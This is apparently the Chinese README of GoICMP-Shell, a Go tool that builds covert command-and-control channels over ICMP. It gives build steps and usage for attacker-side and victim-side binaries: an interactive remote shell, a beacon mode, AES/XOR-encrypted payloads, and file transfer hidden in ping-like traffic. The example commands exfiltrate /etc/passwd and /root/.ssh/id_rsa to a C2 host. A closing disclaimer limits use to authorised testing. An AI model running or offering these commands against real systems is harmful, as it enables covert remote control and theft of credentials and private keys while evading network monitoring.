此工具是一个使用 Go 语言编写的交互式ICMP隧道工具。

---

## ✨ 功能说明
+ **多模式操作**:
    - **会话模式 (**`session`**)**: 提供一个实时的、交互式的远程Shell。
    - **信标模式 (**`beacon`**)**: 客户端以固定的时间间隔回连（心跳），接收并执行服务端下发的指令队列。
+ **数据包步态，加密/编码支持**:
    - 支持 `AES` (CBC模式), `XOR`, `Base64`, `Base32` 以及 `none` (原文) 多种载荷处理方式。
    - 支持包长度、发包频率控制，以及部分协议字段自定义。
+ **文件传输**:
    - **普通文件传输 (**`filetrans`**)**: 高效、可靠地传输大文件，支持自定义MTU。
    - **隐藏文件传输 (**`filetrans-hide`**)**:  将文件数据块嵌入到**仿真**的`ping`命令载荷中，模拟的8字节`struct timeval`时间戳和固定的数据序列。

---

## 🚀 快速编译
### 1. 编译
确保你已经安装了 Go 环境 (版本 >= 1.22)。

```bash
# 进入项目目录
cd /path/to/GoICMP-Shell

# 编译服务端
go build -o icmpsh_ser ./cmd/server/

# 编译客户端
go build -o icmpsh_cli ./cmd/shell/
```



## <font style="color:rgb(13, 18, 57);">🚀</font><font style="color:rgb(13, 18, 57);"> 快速上手</font>
+ **<font style="color:rgb(13, 18, 57);">攻击机</font>**<font style="color:rgb(13, 18, 57);">: 控制主机 (C2)，IP地址为</font><font style="color:rgb(13, 18, 57);background-color:#D8DAD9;">111.111.111.11</font><font style="color:rgb(13, 18, 57);">，在此主机运行服务端。</font>
+ **<font style="color:rgb(13, 18, 57);">目标机</font>**<font style="color:rgb(13, 18, 57);">: 在此主机上运行客户端。</font>

<font style="color:rgb(13, 18, 57);"></font>

### <font style="color:rgb(13, 18, 57);">场景一：</font>
获得一个beacon模式的交互式shell，通讯流量以AES加密

```html
./icmpsh_ser --token <共享密钥> --crypto-mode <加密模式>
./icmpsh_ser --token "MySecretKey123" --crypto-mode aes --mode beacon
```

<font style="color:rgb(13, 18, 57);"> </font>`<font style="color:rgb(13, 18, 57);">--mtu</font>`<font style="color:rgb(13, 18, 57);"> 调整每次发送的数据块大小，</font>`<font style="color:rgb(13, 18, 57);">--interval</font>`<font style="color:rgb(13, 18, 57);"> 控制发包频率，</font>`<font style="color:rgb(13, 18, 57);">--crypto-mode</font>`<font style="color:rgb(13, 18, 57);"> 控制传输加密类型。</font>

```html
./icmpsh_cli --ip <服务端IP> --token <共享密钥> --crypto-mode <加密模式>
./icmpsh_cli --ip 111.111.111.11 --token "MySecretKey123" --crypto-mode aes  --mode beacon
```

### <font style="color:rgb(13, 18, 57);">场景二：</font>
传输单个文件。



<font style="color:rgb(13, 18, 57);">服务端接收文件，并将其保存为 </font>`<font style="color:rgb(13, 18, 57);">icmp_trans_file</font>`<font style="color:rgb(13, 18, 57);">。</font>

```html
# 语法: ./icmpsh_ser --token <共享密钥> --filetrans
./icmpsh_ser --token "MySecretKey123" --filetrans
```

<font style="color:rgb(13, 18, 57);">目标机上运行客户端， </font>`<font style="color:rgb(13, 18, 57);">--filetrans</font>`<font style="color:rgb(13, 18, 57);"> 指定要发送的文件。 </font>`<font style="color:rgb(13, 18, 57);">--mtu</font>`<font style="color:rgb(13, 18, 57);"> 调整每次发送的数据块大小，用 </font>`<font style="color:rgb(13, 18, 57);">--interval</font>`<font style="color:rgb(13, 18, 57);"> 控制发包频率，但不支持</font>`<font style="color:rgb(13, 18, 57);">--crypto-mode</font>`<font style="color:rgb(13, 18, 57);"> 控制传输加密类型。</font>

```html
# 语法: ./icmpsh_cli --ip <服务端IP> --token <共享密钥> --filetrans <文件路径>
./icmpsh_cli --ip 192.168.1.10 --token "MySecretKey123" --filetrans /etc/passwd --mtu 256 --interval 1
```

### <font style="color:rgb(13, 18, 57);">场景三：</font>
隐匿传输单个文件，<font style="color:rgb(13, 18, 57);">使用一个看起来和普通</font>`<font style="color:rgb(13, 18, 57);">ping</font>`<font style="color:rgb(13, 18, 57);">命令几乎一样的流量来传输文件</font>

<font style="color:rgb(13, 18, 57);"></font>

<font style="color:rgb(13, 18, 57);">服务端只负责接收数据，它不需要关心客户端是用哪种方式发送的。</font>

```html
./icmpsh_ser --token "MySecretKey123" --filetrans

```

<font style="color:rgb(13, 18, 57);">使用 </font>`<font style="color:rgb(13, 18, 57);">--fth</font>`<font style="color:rgb(13, 18, 57);"> (</font>`<font style="color:rgb(13, 18, 57);">--filetrans-hide</font>`<font style="color:rgb(13, 18, 57);">) 参数。注意，在此模式下，</font>`<font style="color:rgb(13, 18, 57);">--mtu</font>`<font style="color:rgb(13, 18, 57);"> 是无效的，载荷大小被固定为56字节以模仿</font>`<font style="color:rgb(13, 18, 57);">ping</font>`<font style="color:rgb(13, 18, 57);">命令，也不支持</font>`<font style="color:rgb(13, 18, 57);">--crypto-mode</font>`<font style="color:rgb(13, 18, 57);"> 控制传输加密类型。但可以支持用 </font>`<font style="color:rgb(13, 18, 57);">--interval</font>`<font style="color:rgb(13, 18, 57);"> 控制发包频率。</font>

```html
# 语法: ./icmpsh_cli --ip <服务端IP> --token <共享密钥> --fth <文件路径>
./icmpsh_cli --ip 192.168.1.10 --token "MySecretKey123" --fth /root/.ssh/id_rsa

```



## <font style="color:rgb(13, 18, 57);">🔧</font><font style="color:rgb(13, 18, 57);"> 参数详解</font>
### <font style="color:rgb(13, 18, 57);">服务端 (</font>`<font style="color:rgb(13, 18, 57);">icmpsh_ser</font>`<font style="color:rgb(13, 18, 57);">)</font>
<font style="color:rgb(255, 255, 255);">全屏</font><font style="color:rgb(255, 255, 255);">复制</font>

### <font style="color:rgb(13, 18, 57);">服务端 (</font>`<font style="color:rgb(13, 18, 57);">icmpsh_ser</font>`<font style="color:rgb(13, 18, 57);">)</font>
<font style="color:rgb(255, 255, 255);">全屏</font><font style="color:rgb(255, 255, 255);">复制</font>

| **<font style="color:rgb(255, 255, 255);">参数</font>** | **<font style="color:rgb(255, 255, 255);">别名</font>** | **<font style="color:rgb(255, 255, 255);">类型</font>** | **<font style="color:rgb(255, 255, 255);">默认值</font>** | **<font style="color:rgb(255, 255, 255);">描述</font>** |
| --- | --- | --- | --- | --- |
| `<font style="color:rgb(0, 0, 0);">--token</font>` | `<font style="color:rgb(0, 0, 0);">-t</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"go-icmpshell"</font> | <font style="color:rgb(0, 0, 0);">用于客户端和服务端认证的共享密钥。</font> |
| `<font style="color:rgb(0, 0, 0);">--filetrans</font>` | `<font style="color:rgb(0, 0, 0);">-ft</font>` | <font style="color:rgb(0, 0, 0);">bool</font> | <font style="color:rgb(0, 0, 0);">false</font> | <font style="color:rgb(0, 0, 0);">启动文件接收模式。此模式下，其他模式和加密参数无效。</font> |
| `<font style="color:rgb(0, 0, 0);">--mode</font>` | `<font style="color:rgb(0, 0, 0);">-m</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"session"</font> | <font style="color:rgb(0, 0, 0);">运行模式，可选:</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">session</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">(实时会话) 或</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">beacon</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">(信标)。</font> |
| `<font style="color:rgb(0, 0, 0);">--crypto-mode</font>` | `<font style="color:rgb(0, 0, 0);">-cm</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"none"</font> | <font style="color:rgb(0, 0, 0);">载荷加密/编码模式，可选:</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">aes</font>`<br/><font style="color:rgb(0, 0, 0);">,</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">xor</font>`<br/><font style="color:rgb(0, 0, 0);">,</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">base64</font>`<br/><font style="color:rgb(0, 0, 0);">,</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">base32</font>`<br/><font style="color:rgb(0, 0, 0);">,</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">none</font>`<br/><font style="color:rgb(0, 0, 0);">。</font> |
| `<font style="color:rgb(0, 0, 0);">--mtu</font>` | | <font style="color:rgb(0, 0, 0);">int</font> | <font style="color:rgb(0, 0, 0);">576</font> | <font style="color:rgb(0, 0, 0);">（会话/信标模式）定义单包最大载荷，最小为64。</font> |


### <font style="color:rgb(13, 18, 57);">客户端 (</font>`<font style="color:rgb(13, 18, 57);">icmpsh_cli</font>`<font style="color:rgb(13, 18, 57);">)</font>
<font style="color:rgb(255, 255, 255);">全屏</font><font style="color:rgb(255, 255, 255);">复制</font>

| **<font style="color:rgb(255, 255, 255);">参数</font>** | **<font style="color:rgb(255, 255, 255);">别名</font>** | **<font style="color:rgb(255, 255, 255);">类型</font>** | **<font style="color:rgb(255, 255, 255);">默认值</font>** | **<font style="color:rgb(255, 255, 255);">描述</font>** |
| --- | --- | --- | --- | --- |
| `<font style="color:rgb(0, 0, 0);">--ip</font>` | `<font style="color:rgb(0, 0, 0);">-i</font>` | <font style="color:rgb(0, 0, 0);">string</font> | **<font style="color:rgb(0, 0, 0);">(必需)</font>** | <font style="color:rgb(0, 0, 0);">要连接的服务端IP地址。</font> |
| `<font style="color:rgb(0, 0, 0);">--token</font>` | `<font style="color:rgb(0, 0, 0);">-t</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"go-icmpshell"</font> | <font style="color:rgb(0, 0, 0);">共享密钥，必须与服务端匹配。</font> |
| `<font style="color:rgb(0, 0, 0);">--filetrans</font>` | `<font style="color:rgb(0, 0, 0);">-ft</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">""</font> | <font style="color:rgb(0, 0, 0);">普通文件传输模式，值为要发送的文件路径。与</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">--fth</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">及其他模式互斥。</font> |
| `<font style="color:rgb(0, 0, 0);">--filetrans-hide</font>` | `<font style="color:rgb(0, 0, 0);">-fth</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">""</font> | <font style="color:rgb(0, 0, 0);">隐藏文件传输模式，值为要发送的文件路径。与</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">--ft</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">及其他模式互斥。</font> |
| `<font style="color:rgb(0, 0, 0);">--mode</font>` | `<font style="color:rgb(0, 0, 0);">-m</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"session"</font> | <font style="color:rgb(0, 0, 0);">运行模式，</font>`<font style="color:rgb(0, 0, 0);">session</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">或</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">beacon</font>`<br/><font style="color:rgb(0, 0, 0);">。</font> |
| `<font style="color:rgb(0, 0, 0);">--crypto-mode</font>` | `<font style="color:rgb(0, 0, 0);">-cm</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"none"</font> | <font style="color:rgb(0, 0, 0);">加密/编码模式，必须与服务端匹配。</font> |
| `<font style="color:rgb(0, 0, 0);">--mtu</font>` | | <font style="color:rgb(0, 0, 0);">int</font> | <font style="color:rgb(0, 0, 0);">576</font> | <font style="color:rgb(0, 0, 0);">定义单包最大载荷，最小为64。</font> |
| `<font style="color:rgb(0, 0, 0);">--interval</font>` | | <font style="color:rgb(0, 0, 0);">int</font> | <font style="color:rgb(0, 0, 0);">1</font> | <font style="color:rgb(0, 0, 0);">发包的时间间隔，单位为秒，最小为1。</font> |
| `<font style="color:rgb(0, 0, 0);">--icmpId</font>` | | <font style="color:rgb(0, 0, 0);">uint</font> | <font style="color:rgb(0, 0, 0);">1000</font> | <font style="color:rgb(0, 0, 0);">通信所使用的ICMP ID。</font> |


### <font style="color:rgb(13, 18, 57);">客户端各模式下参数有效性总结</font>
| **<font style="color:rgb(255, 255, 255);">操作模式 (通过flag触发)</font>** | `**<font style="color:rgb(255, 255, 255);">--mtu</font>**`<br/>**<font style="color:rgb(255, 255, 255);">   </font>****<font style="color:rgb(255, 255, 255);">调整数据块大小</font>** | `**<font style="color:rgb(255, 255, 255);">--interval</font>**`<br/>**<font style="color:rgb(255, 255, 255);">   </font>****<font style="color:rgb(255, 255, 255);">控制发包频率</font>** | `**<font style="color:rgb(255, 255, 255);">--crypto-mode</font>**`<br/>**<font style="color:rgb(255, 255, 255);">   </font>****<font style="color:rgb(255, 255, 255);">控制传输加密类型</font>** |
| --- | :---: | :---: | :---: |
| **<font style="color:rgb(0, 0, 0);">会话/信标模式</font>**<font style="color:rgb(0, 0, 0);">   </font><font style="color:rgb(0, 0, 0);">(</font>`<font style="color:rgb(0, 0, 0);">--mode</font>`<br/><font style="color:rgb(0, 0, 0);">)</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">✅</font><font style="color:rgb(0, 0, 0);"> (仅beacon)</font> | <font style="color:rgb(0, 0, 0);">✅</font> |
| **<font style="color:rgb(0, 0, 0);">普通文件传输</font>**<font style="color:rgb(0, 0, 0);">   </font><font style="color:rgb(0, 0, 0);">(</font>`<font style="color:rgb(0, 0, 0);">--filetrans</font>`<br/><font style="color:rgb(0, 0, 0);">)</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">❌</font><font style="color:rgb(0, 0, 0);"> (仅支持原文)</font> |
| **<font style="color:rgb(0, 0, 0);">隐藏文件传输</font>**<font style="color:rgb(0, 0, 0);">   </font><font style="color:rgb(0, 0, 0);">(</font>`<font style="color:rgb(0, 0, 0);">--fth</font>`<br/><font style="color:rgb(0, 0, 0);">)</font> | <font style="color:rgb(0, 0, 0);">❌</font><font style="color:rgb(0, 0, 0);"> (固定为56字节)</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">❌</font><font style="color:rgb(0, 0, 0);"> (仅支持原文)</font> |


## <font style="color:rgb(13, 18, 57);">⚠️</font><font style="color:rgb(13, 18, 57);"> 免责声明</font>
<font style="color:rgb(13, 18, 57);">本工具仅供授权的渗透测试和安全研究使用。作者不对任何滥用本工具造成的后果负责。请遵守当地法律法规。</font>

